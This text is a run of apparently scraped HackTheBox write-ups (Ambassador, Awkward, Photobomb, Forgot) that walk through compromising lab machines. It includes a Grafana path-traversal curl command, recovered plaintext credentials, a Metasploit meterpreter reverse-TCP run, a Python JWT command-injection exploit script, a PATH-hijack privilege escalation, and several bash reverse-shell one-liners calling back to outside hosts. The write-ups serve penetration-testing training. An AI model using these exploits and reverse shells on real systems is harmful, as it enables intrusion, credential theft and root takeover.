ID: 15| Capabilities flags: 65535| Some Capabilities: Support41Auth, SupportsLoadDataLocal, InteractiveClient, FoundRows, IgnoreSigpipes, LongPassword, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsCompression, DontAllowDatabaseTableColumn, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase, SwitchToSSLAfterHandshake, SupportsTransactions, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins| Status: Autocommit| Salt: M,\\x11\\x0C\\x110&amp;lt;\\x01\\x0D%5zru2j{z\\x14U|_ Auth Plugin Name: caching_sha2_passwordWe have 3 ports open which might be insteressting. Mysql (for which we don’t have any credentials (yet)) and web server on ports 80 and 3000Website on port 80There’s nothing special running port 80 and the webserver. At least not on first sight.Grafana on port 3000If we check what’s on port 3000, we’ll find Grafana, and we also enumerate the version, since it’s on the login page =&amp;gt; v8.2.0 (d7f71e9eae).Initial foothold - getting access as “developer”Grafana - Directory Traversal and Arbitrary File Read - CVE-2021-43798Grafana is vulnerable to 2021-43798 (Directory Traversal and Arbitrary File Read). I’ve used following exploit https://www.exploit-db.com/exploits/50581, we can however also just use curl.curl --path-as-is http://10.10.11.183:3000/public/plugins/barchart/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o db.dbRequest above returns grafana database, which we can read localy.┌──(luka㉿yokai)-[~/htb/boxes/ambasador]└─$ sqlite3 db.db SQLite version 3.39.4 2022-09-29 15:55:41Enter &quot;.help&quot; for usage hints.sqlite&amp;gt; .tablesalert login_attempt ... dashboard_tag team_member dashboard_version temp_user data_source test_data kv_store user library_element user_auth library_element_connection user_auth_token Password can be found in data_source table in plain text.sqlite&amp;gt; select * from data_source;2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-11-24 19:20:49|0|{}|1|uKewFgM4zMysql credentials are grafana:dontStandSoCloseToMe63221!Explore the MySQL on 3306As now we’ve got the credentials, let’s try to connect to MySql database.┌──(luka㉿yokai)-[~/htb/boxes/ambasador]└─$ mysql -h 10.10.11.183 -u grafana -p&#39;dontStandSoCloseToMe63221!&#39;Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MySQL connection id is 35Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.MySQL [(none)]&amp;gt; show databases;+--------------------+| Database |+--------------------+| grafana || information_schema || mysql || performance_schema || sys || whackywidget |+--------------------+6 rows in set (0.050 sec)Change database to whackywidgetMySQL [(none)]&amp;gt; use whackywidget;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMySQL [whackywidget]&amp;gt; show tables;+------------------------+| Tables_in_whackywidget |+------------------------+| users |+------------------------+1 row in set (0.036 sec)MySQL [whackywidget]&amp;gt; select * from users;+-----------+------------------------------------------+| user | pass |+-----------+------------------------------------------+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+1 row in set (0.043 sec)We have developer’s credentials now.Decoding the developer’s password and logging in via SSHWe can base64 decode the credentials that we’ve found in the mysql database and login using SSH.┌──(luka㉿yokai)-[~/htb/boxes/ambasador]└─$ echo &quot;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&quot; | base64 -danEnglishManInNewYork027468┌──(luka㉿yokai)-[~/htb/boxes/ambasador]└─$ ssh -l developer 10.10.11.183...Last login: Fri Sep 2 02:33:30 2022 from 10.10.0.1developer@ambassador:~$ iduid=1000(developer) gid=1000(developer) groups=1000(developer)Credentials work for ssh: developer:anEnglishManInNewYork027468Privilege EscalationWhile being logged in as developer and after reading the flag, we might notice .gitconfig file in the home directory.developer@ambassador:~$ ls -latotal 48drwxr-xr-x 7 developer developer 4096 Sep 14 11:01 .drwxr-xr-x 3 root root 4096 Mar 13 2022 ..lrwxrwxrwx 1 root root 9 Sep 14 11:01 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 developer developer 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 developer developer 3798 Mar 14 2022 .bashrcdrwx------ 3 developer developer 4096 Mar 13 2022 .cache-rw-rw-r-- 1 developer developer 93 Sep 2 02:28 .gitconfigdrwx------ 3 developer developer 4096 Mar 14 2022 .gnupgdrwxrwxr-x 3 developer developer 4096 Mar 13 2022 .local-rw-r--r-- 1 developer developer 807 Feb 25 2020 .profiledrwx------ 3 developer developer 4096 Mar 14 2022 snapdrwx------ 2 developer developer 4096 Mar 13 2022 .ssh-rw-r----- 1 root developer 33 Nov 24 19:20 user.txtdeveloper@ambassador:~$ cat .gitconfig [user] name = Developer email = developer@ambassador.local[safe] directory = /opt/my-appIf we follow the git directory and check the /opt/my-app we’ll find whackywidget againdeveloper@ambassador:/opt/my-app$ ls -latotal 24drwxrwxr-x 5 root root 4096 Mar 13 2022 .drwxr-xr-x 4 root root 4096 Sep 1 22:13 ..drwxrwxr-x 4 root root 4096 Mar 13 2022 envdrwxrwxr-x 8 root root 4096 Mar 14 2022 .git-rw-rw-r-- 1 root root 1838 Mar 13 2022 .gitignoredrwxrwxr-x 3 root root 4096 Mar 13 2022 whackywidgetBy the way. We also should note the consul app that’s find in /opt because who knows…In /opt/my-app we can either use git commands or browse the .git directory.developer@ambassador:/opt/my-app$ git logcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&amp;gt; main)Author: Developer &amp;lt;developer@ambassador.local&amp;gt;Date: Sun Mar 13 23:47:36 2022 +0000 tidy config scriptcommit c982db8eff6f10f8f3a7d802f79f2705e7a21b55Author: Developer &amp;lt;developer@ambassador.local&amp;gt;Date: Sun Mar 13 23:44:45 2022 +0000 config scriptcommit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6Author: Developer &amp;lt;developer@ambassador.local&amp;gt;Date: Sun Mar 13 22:47:01 2022 +0000 created project with django CLIcommit 4b8597b167b2fbf8ec35f992224e612bf28d9e51Author: Developer &amp;lt;developer@ambassador.local&amp;gt;Date: Sun Mar 13 22:44:11 2022 +0000 .gitignoreWhat should immediately draw our attention is that there has been some changes in the config. We should check what this were.Consul What is Consul?Consul is a service networking solution that enables teams to manage secure network connectivity between services and across multi-cloud environments and runtimes. Consul offers service discovery, identity-based authorization, L7 traffic management, and service-to-service encryption. Reference: https://developer.hashicorp.com/consulWe will need the token above, so make not of it.As that token has enough privileges to start services (consul runs as root!) we can do so.developer@ambassador:/opt/consul$ consul acl token list --token bb03b43b-1d81-d62b-24b5-39540ee469b5AccessorID: 00000000-0000-0000-0000-000000000002SecretID: anonymousDescription: Anonymous TokenLocal: falseCreate Time: 2022-03-13 23:14:16.941144142 +0000 UTCLegacy: falseAccessorID: 2aae5590-4b99-3b3d-56d9-71b61ee9e744SecretID: bb03b43b-1d81-d62b-24b5-39540ee469b5Description: Bootstrap Token (Global Management)Local: falseCreate Time: 2022-03-13 23:14:25.977142971 +0000 UTCLegacy: falsePolicies: 00000000-0000-0000-0000-000000000001 - global-managementdeveloper@ambassador:/opt/consul$ consul members --token bb03b43b-1d81-d62b-24b5-39540ee469b5 Node Address Status Type Build Protocol DC Partition Segmentambassador 127.0.0.1:8301 alive server 1.13.2 2 dc1 default &amp;lt;all&amp;gt;We can enumerate more configuration using following commandcurl http://127.0.0.1:8500/v1/agent/self -H &#39;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#39; -s | python3 -m json.toolExploitation using Meterpreter (creates service on Consul)Let’s set up local port forwarding on the attackers machine using SSH. We’re interessted on port 8500ssh -N -L 8500:localhost:8500 -l developer 10.10.11.183Metasploit optionsmsf6 exploit(multi/misc/consul_service_exec) &amp;gt; optionsModule options (exploit/multi/misc/consul_service_exec): Name Current Setting Required Description ---- --------------- -------- ----------- ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5 no Consul Agent ACL token Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 127.0.0.1 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 8500 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes The base path URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual hostPayload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.8 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 LinuxAnd we have root access and can simply access root shell if we want to!msf6 exploit(multi/misc/consul_service_exec) &amp;gt; run[*] Started reverse TCP handler on 10.10.14.8:4444 [*] Creating service &#39;GWpSvUawj&#39;[*] Service &#39;GWpSvUawj&#39; successfully created.[*] Waiting for service &#39;GWpSvUawj&#39; script to trigger[*] Sending stage (1017704 bytes) to 10.10.11.183[*] Meterpreter session 2 opened (10.10.14.8:4444 -&amp;gt; 10.10.11.183:52326) at 2022-11-25 14:35:02 +0100[*] Removing service &#39;GWpSvUawj&#39;[*] Command Stager progress - 100.00% done (763/763 bytes)meterpreter &amp;gt; getuid Server username: rootmeterpreter &amp;gt; sysinfoComputer : 10.10.11.183OS : Ubuntu 20.04 (Linux 5.4.0-126-generic)Architecture : x64BuildTuple : i486-linux-muslMeterpreter : x86/linuxThe Manual WayWe will register a new service using following command:developer@ambassador:/tmp$ curl -X PUT -d &#39;{&quot;ID&quot;: &quot;id&quot;, &quot;Name&quot;: &quot;name&quot;, &quot;Address&quot;: &quot;127.0.0.1&quot;, &quot;Port&quot;: 80, &quot;check&quot;: {&quot;Args&quot;: [&quot;/usr/bin/bash&quot;, &quot;/tmp/run.sh&quot;], &quot;interval&quot;: &quot;10s&quot;, &quot;timeout&quot;: &quot;1s&quot;}}&#39; -H &#39;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#39; http://127.0.0.1:8500/v1/agent/service/register We’ll start /tmp/run.sh using the command above above, which simply copies root.txt and makes it readable for developer.developer@ambassador:/tmp$ cat run.sh cp /root/root.txt /tmp/root.txtchown developer:developer /tmp/root.txtYou can go for shell or anything you want if you like ;).developer@ambassador:/tmp$ ls -la root.txt -rw-r----- 1 developer developer 33 Nov 25 17:33 root.txtThis is however pretty much the same thing what meterpreter did for us above" }, { "title": "(HTB) - Awkward", "url": "/posts/awkward/", "categories": "HackTheBox, Linux", "tags": "JWT, Password Reuse, Password Cracking, Cookie Manipulation, Dictionary attack, API Abuse, Authentication bypass, Local File Inclusion, Arbitrary File Read, Clear Text Credentials, OS Command Injection, Server Side Request Forgery (SSRF), Misconfiguration", "date": "2023-03-04 10:33:00 +0100", "snippet": "EnumerationNMAPNmap scan report for 10.129.45.168Host is up (0.045s latency).Not shown: 65514 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)80/tcp open http nginx 1.18.0 (Ubuntu)There is nothing much to say here, we have just 2 ports open, so let’s check the webserver on port 80.WebserverWhen browsing to webserver using browser, we’d get redirected to http://hat-valley.htb so let’s add that to /etc/hosts. After checking the website, keep proxy open at all times.After going to hat-valley.htbWhatwebChecking the Whatweb input, we have nginx/1.18.0, Site is running Express.js, JQuery’s version is 3.0.0Burp - Site MapWhen taking a look at Site map, i’ve noticed certain cookie ==&amp;gt; token=guest. This is something to make a note of!VHOST - Bruteforce using FFUF┌──(luka㉿yokai)-[~/htb/boxes/awkward]└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://hat-valley.htb -H &#39;Host: FUZZ.hat-valley.htb&#39; --fs 132 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://hat-valley.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.hat-valley.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 132________________________________________________store [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 33ms]Let’s add store.hat-valley.htb to /etc/hosts and check the website.We need some credentials, which we don’t have.LinkfinderI’ve noticed when i tried to use repeater or simply check the source code of the site, that the webpage would not load as Javascript isn’t running.There is where i thought of Linkfinder which checks javascripts for links and routes in the Javascript files.And it found some interesting pages, indeed.So we have hr, api, dashboard,…Finding hidden dashboardhttp://hat-valley.htb/hr presents another login mask.What if we change the token from guest to token=admin?We get in!We can try to enter a Leave but it appears to be a dead end, and requets are ending with 500 Internal Error.Finding passwordsNow again in Burp, new site shows up in the api routeIt ends with 500 Internal Error but after sending it to Repeater and removing the cookie, the contents were shownDecrypting with HashcatThrowing the hashlist into hashcat returned 1 password backhashcat hashes /Users/cm/Projects/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 1400.......Dictionary cache hit:* Filename..: /Users/cm/Projects/SecLists/Passwords/Leaked-Databases/rockyou.txt* Passwords.: 14344384* Bytes.....: 139921497* Keyspace..: 14344384e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123So we have credentials for christopher.jones:chris123.Logging in to HR as christopher.jonesSo christopher’s credentials work for HR and we can see below that token was generated.Again checking the Burp’s request, this one stands out:Exploiting Server-Side Request Forgery (SSRF)If we change the URL with our own, we can clearly see that we have SSRF vulnerability here.Let’S try to check the open ports on the localhostwfuzz -c -z range,1-10000 --hh 0 -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2NzI2ODEwfQ.zvrc3itkUEVgwgejeHZpsWGq7fEvz-fPUh5uGuVmI9o&quot; &#39;http://hat-valley.htb/api/store-status?url=&quot;http://localhost:FUZZ/&quot;&#39;This looks promising:Reading the source code on localhost:3002 (api)I opened the response in browser for better readability!Method that appears interesting and appears to be vulnerable is the /api/all-leave.User in the token seems to be thrown through Bad-character check, however not all signs appear to be on the blacklist.const bad = [&quot;;&quot;,&quot;&amp;amp;&quot;,&quot;|&quot;,&quot;&amp;gt;&quot;,&quot;&amp;lt;&quot;,&quot;*&quot;,&quot;?&quot;,&quot;`&quot;,&quot;$&quot;,&quot;(&quot;,&quot;)&quot;,&quot;{&quot;,&quot;}&quot;,&quot;[&quot;,&quot;]&quot;,&quot;!&quot;,&quot;#&quot;]...exec(&quot;awk &#39;/&quot; + user + &quot;/&#39; /var/www/private/leave_requests.csv&quot;, {encoding: &#39;binary&#39;, maxBuffer: 51200000}, (error, stdout, stderr) =&amp;gt; {...Crack that JWT┌──(luka㉿yokai)-[~/htb/boxes/awkward]└─$ john jwt_enc --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256Using default input encoding: UTF-8Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 ASIMD 4x])Will run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status123beany123Apparently takes token parameter JWT or HR user, which makes exploitation easier.I’ve written simple program that helped me with debugging. It’s optional and not really needed, but i’d like to mention that ModeJS / ExpressJS app can get running in 15 Minutes or even less.const express = require(&#39;express&#39;)const cookieParser = require(&quot;cookie-parser&quot;);const jwt = require(&quot;jsonwebtoken&quot;);const exec = require(&#39;child_process&#39;).exec;const app = express()const port = 3000app.use(cookieParser());app.get(&#39;/&#39;, (req, res) =&amp;gt; { res.send(&#39;Hello World!&#39;)})app.get(&#39;/api/all-leave&#39;, (req, res) =&amp;gt; { const user_token = req.cookies.token var authFailed = false var user = null var TOKEN_SECRET=&quot;123beany123&quot; if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET) if(!decodedToken.username) { authFailed = true } else { user = decodedToken.username } } if(authFailed) { return res.status(401).json({Error: &quot;Invalid Token&quot;}) } if(!user) { return res.status(500).send(&quot;Invalid user&quot;) } const bad = [&quot;;&quot;,&quot;&amp;amp;&quot;,&quot;|&quot;,&quot;&amp;gt;&quot;,&quot;&amp;lt;&quot;,&quot;*&quot;,&quot;?&quot;,&quot;`&quot;,&quot;$&quot;,&quot;(&quot;,&quot;)&quot;,&quot;{&quot;,&quot;}&quot;,&quot;[&quot;,&quot;]&quot;,&quot;!&quot;,&quot;#&quot;] const badInUser = bad.some(char =&amp;gt; user.includes(char)); if(badInUser) { return res.status(500).send(&quot;Bad character detected.&quot;) } console.log(&quot;User: &quot; + user) console.log(&quot;awk &#39;/&quot; + user + &quot;/&#39; /test.csv&quot;) exec(&quot;awk &#39;/&quot; + user + &quot;/&#39; /test.csv&quot;, {encoding: &#39;binary&#39;, maxBuffer: 51200000}, (error, stdout, stderr) =&amp;gt; { if(stdout) { return res.status(200).send(new Buffer(stdout, &#39;binary&#39;)); } if (error) { return res.status(500).send(&quot;Failed to retrieve leave requests&quot;) } if (stderr) { return res.status(500).send(&quot;Failed to retrieve leave requests&quot;) } })})app.listen(port, () =&amp;gt; { console.log(`Example app listening on port ${port}`)})And exploit script. (Target needs to be modified accordingly, same as payload)import sysimport requestsimport jwtdef jwt_inject_command(target,payload,secret): #encoded_jwt = jwt.encode({secret}) encoded_jwt = jwt.encode({&#39;username&#39;: payload}, secret, algorithm=&#39;HS256&#39;) print(&quot;Token:&quot; + encoded_jwt) cookies={ &#39;token&#39;:encoded_jwt } r = requests.get(target,cookies=cookies) return rdef main(): if len(sys.argv)!=1: print(&quot;Usage: SCRIPT URL PAYLOAD&quot;) sys.exit(1) #target = sys.argv[1] #payload = sys.argv[2] #target = &#39;http://hat-valley.htb/api/all-leave&#39; target= &#39;http://localhost:3000/api/all-leave&#39; # Arbitrary read payload = &quot;/&#39; /etc/hostname &#39;/&quot; secret=&quot;123beany123&quot; out = jwt_inject_command(target,payload,secret) print(out.text)if __name__ == &#39;__main__&#39;: main()Before automating anything, i’ll just be trying to leak some useful data, simply by exchanging the path above. E.g., /var/www/hat-valley.htb/server/server.js returns with the source code and SQL Credentials.Automate SSRF+LFI using Pythonimport sysimport requestsimport jwtdef jwt_inject_command(target,payload,secret): #encoded_jwt = jwt.encode({secret}) encoded_jwt = jwt.encode({&#39;username&#39;: payload}, secret, algorithm=&#39;HS256&#39;) #print(&quot;Token:&quot; + encoded_jwt) cookies={ &#39;token&#39;:encoded_jwt } r = requests.get(target,cookies=cookies) return rdef main(): if len(sys.argv)!=1: print(&quot;Usage: SCRIPT URL PAYLOAD&quot;) sys.exit(1) #target = sys.argv[1] #payload = sys.argv[2] target = &#39;http://hat-valley.htb/api/all-leave&#39; secret=&quot;123beany123&quot; #target= &#39;http://localhost:3000/api/all-leave&#39; for i in range(100,1000): # Arbitrary read payload = &quot;/&#39; /proc/{}/cmdline &#39;/&quot;.format(i) out = jwt_inject_command(target,payload,secret) if &quot;Failed&quot; not in (out.text): print(&quot;Process found =&amp;gt; {}:&quot;.format(str(i)) + out.text )if __name__ == &#39;__main__&#39;: main().bashrc in the /home/bean, gives us a clue what we should be searching for.Finding backup scriptChecking the /home/bean/Documents/backup_home.sh it appears that home is being backed up and saved into .tar.gz.#!/bin/bashmkdir /home/bean/Documents/backup_tmpcd /home/beantar --exclude=&#39;.npm&#39; --exclude=&#39;.cache&#39; --exclude=&#39;.vscode&#39; -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .date &amp;gt; /home/bean/Documents/backup_tmp/time.txtcd /home/bean/Documents/backup_tmptar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .rm -r /home/bean/Documents/backup_tmpGetting shell as BeanThis is the script i’ve used to download the tar.gzimport sysimport requestsimport jwtdef jwt_inject_command(target,payload,secret): #encoded_jwt = jwt.encode({secret}) encoded_jwt = jwt.encode({&#39;username&#39;: payload}, secret, algorithm=&#39;HS256&#39;) #print(&quot;Token:&quot; + encoded_jwt) cookies={ &#39;token&#39;:encoded_jwt } proxies={ &#39;http&#39;: &#39;http://127.0.0.1:8080&#39; } r = requests.get(target,cookies=cookies,proxies=proxies,stream=True) return rdef main(): if len(sys.argv)!=1: print(&quot;Usage: SCRIPT URL PAYLOAD&quot;) sys.exit(1) target = &#39;http://hat-valley.htb/api/all-leave&#39; secret=&quot;123beany123&quot; payload = &quot;/&#39; /home/bean/Documents/backup/bean_backup_final.tar.gz &#39;/&quot; out = jwt_inject_command(target,payload,secret) target_path = &#39;bkp.tar.gz&#39; if out.status_code == 200: with open(target_path, &#39;wb&#39;) as f: f.write(out.raw.read())if __name__ == &#39;__main__&#39;: main()We need to unpack the tar.gz two times, so output should be in the end as seen below.Search for bean using grepThere we have a file ./.config/xpad/content-DS1ZS1.┌──(luka㉿yokai)-[~/htb/boxes/awkward/bkp]└─$ cat ./.config/xpad/content-DS1ZS1TO DO:- Get real hat prices / stock from Christine- Implement more secure hashing mechanism for HR system- Setup better confirmation message when adding item to cart- Add support for item quantity &amp;gt; 1- Implement checkout systemboldHR SYSTEM/boldbean.hill014mrbeanrules!#Phttps://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.htmlboldMAKE SURE TO USE THIS EVERYWHERE ^^^/boldCredentials above work for SSH!Privilege Escalation from bean to rootPrivilege Escalation is not straightforward at all. We have 2 Users on the box, one is bean and other one is christine. I wasn’t really able to find much files/directories owned by christine and no processes.PSPYThis looked interesting when running pspy64s:It runs as root and it triggers when /var/www/private/leave_requests.csv changes, which we can control through HR panel!Store.hat-valley.htbWe can login onto store.hat-valley.htb using admin:014mrbeanrules!#P, which is same password that bean has for SSH access on the Awkward box.We can write to two directories:PHP files will not execute:If we check the script on the backend - e.g., the cart_actions.php we would notice that user input goes through system call 3 times.bean@awkward:/var/www/store$ grep -rnw . -e &quot;system(&quot;./cart_actions.php:38: system(&quot;echo &#39;***Hat Valley Cart***&#39; &amp;gt; {$STORE_HOME}cart/{$user_id}&quot;);./cart_actions.php:40: system(&quot;head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 &amp;gt;&amp;gt; {$STORE_HOME}cart/{$user_id}&quot;);./cart_actions.php:69: system(&quot;sed -i &#39;/item_id={$item_id}/d&#39; {$STORE_HOME}cart/{$user_id}&quot;);The one that we can exploit and make something out of it is the head -2 .... | tail -1 invocation, by rewriting single line of our chosing. This is possible because we control item_id AND the user_id.The way we control those values is a little bit strange, but application reads those from files into which we can write, to cart and product-details as seen few screenshots above.Blacklist does not stop us from path traversing and adding slashes, dots, dashes. For example like this:We can notice that we’ve successfully written into a file. (mind the head and tail, we just append and not rewrite everything).Observing the pspy64s output, this is the command that fires in the background.sh -c head -2 /var/www/store/product-details/4.txt | tail -1 &amp;gt;&amp;gt; /var/www/store/cart/../../../../../var/www/private/leave_requests.csvWe need SSRF again to check the /var/www/private/leave_results.csvScript use that will be invoked after inotifywait fires on modification.bean@awkward:/tmp$ cat rev.sh #!/bin/bashbash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.6/4444 0&amp;gt;&amp;amp;1Root shell has opened" }, { "title": "(HTB) - Photobomb", "url": "/posts/photobomb/", "categories": "HackTheBox, Linux", "tags": "Web, Vulnerability Assessment, Injection, Custom Applications, NGINX, Python, SUDO Exploitation, OS Command Injection", "date": "2023-03-04 09:33:00 +0100", "snippet": "Photobomb is an easy linux box where we have to enumerate a web application, achieving OS command injection. For privilege escalation, there is vulnerable script which uses relative path which we can exploitEnumerationNmapLet’s start NMAPNmap scan report for photobomb.htb (10.129.224.122)Host is up (0.036s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)| 256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)|_ 256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Photobomb|_http-favicon: Unknown favicon MD5: 622B9ED3F0195B2D1811DF6F278518C2| http-methods: |_ Supported Methods: GET HEAD|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Oct 10 19:03:58 2022 -- 1 IP address (1 host up) scanned in 16.42 secondsWe have ports 80 and 22, so we should probably focus on webserver on port 80!Web ServerWhatwebUsing Whatweb we get a redirect back to photobomb.htb which will be added to /etc/hostsWe can also see that we’re dealing with Ubuntu and we know exact version of NGINX server, which is 1.18.0Browser and running Burp in the backgroundLet’s check the website through browser and let’s not forget to start Burp to run in the background!So this is the website:If we click on click here! prompt opens asking us for credentials:I’d search for default credentials if i could fingerprint the service but doesn’t seem to be the case here.Leaked credentials in JS FileIf we’ve had Burp open, we’d find photobomb.js file in Site MapOtherwise checking source should do well, as well.Login using pH0t0:b0Mb!404 Not found = Sinatra?If we open non-existing page we get onto this site:And the sourceWe can see another port 4567 open on localhost. Hopefully we’ve noticed that some kind of Sinatra is running, and if we google =&amp;gt; https://sinatrarb.comEnumerating download photoIf we scroll down, we can see that we have some sort of download optionThis is request seen in BurpAfter checking for LFI, RFI, i’ve noticed that filetype parameter is vulnerable to OS Command InjectionWe just need to make sure to inject valid photo, otherwise the payload won’t work (at least it did not work for me)Getting Shell as WizardOS Command InjectionI’ve used following payload for reverse shellbash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.216/4242 0&amp;gt;&amp;amp;1&quot;Before i’ve sent it i’ve URL encoded it!Privilege Escalation to rootRelative path used - script can be ran as sudeThere we are. We now have a shell as wizard and sudo -l already gives us a hint what should we be looking for. There’s a script runing with root privileges named /opt/cleanup.sh.wizard@photobomb:~$ cat /opt/cleanup.shcat /opt/cleanup.sh#!/bin/bash. /opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;amp;&amp;amp; ! [ -L log/photobomb.log ]then /bin/cat log/photobomb.log &amp;gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \\;Notice that we the last find does not have absolute path specified as commands before that.We can exploit that simply by modifing our PATH by placing find script before real find.Let us do that:wizard@photobomb:~$ whereis findwhereis findfind: /usr/bin/find /usr/share/man/man1/find.1.gz /usr/share/info/find.info-2.gz /usr/share/info/find.info-1.gz /usr/share/info/find.info.gzwizard@photobomb:~$ echo $PATHecho $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binwizard@photobomb:~$ export PATH=/home/wizard:$PATHexport PATH=/home/wizard:$PATHwizard@photobomb:~$ echo $PATHecho $PATH/home/wizard:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binecho &#39;#!/bin/bash&#39; &amp;gt; findecho &#39;/bin/bash -c &quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.216/5555 0&amp;gt;&amp;amp;1&quot; &amp;amp;&#39; &amp;gt;&amp;gt; findMake sure to make thae /home/wizard/find script executable using chmod +x find!When runing the /opt/cleanup.sh you’ll have to include the ENV variable = PATH." }, { "title": "(HTB) - Forgot", "url": "/posts/forgot/", "categories": "HackTheBox, Linux", "tags": "Web, Vulnerability Assessment, Injection, Source Code Analysis, Outdated Software, Flask, Werkzeug, Authentication bypass, Clear Text Credentials, Host Header Injection, Code Injection", "date": "2023-03-03 09:33:00 +0100", "snippet": "Forgot is an intermediate box which start with few basic web application misconfigurations. Box runs vulnerable tensorflow python package in a script which is run as sudo/rootEnumerationNMAPNmap scan report for 10.129.249.130Host is up (0.042s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE22/tcp open ssh| ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)| 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)|_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)80/tcp open http|_http-title: LoginWebsiteFinding username in the source codeIf we check th source then we’d find a user robert-dev-14320.We cannot guess the password or brute-force it as caching and responses make the wait completely unbearable, but there is forgot password present so let’s check that.Initial Foothold - digging deeperHost Header Poisoning on forgot passwordIt appears that we can poison host header which makes the webserver to issue an request (HTTP!) to our own serverWe can set a new password for robert-dev-14320 and access the Support Portal. Be patient and make sure you URL encode your token!Getting onto Admin PanelWe can find admin’s dashboards if we check the site map.If we however try to access it with robert-dev-14320 we’d be redirected to denied page.Good thing is that we can tamper the authorization header without having the right password as apparently only user will be checked.Finding Diego’s credentialsIf we check the response in Burp of the request above to admin_tickets we’d find diego’s password.Credentials work with SSH diego:dCb#1!x0%gjq.Privilege EscalationWe can run script as sudodiego@forgot:~$ sudo -lMatching Defaults entries for diego on forgot: env_reset, 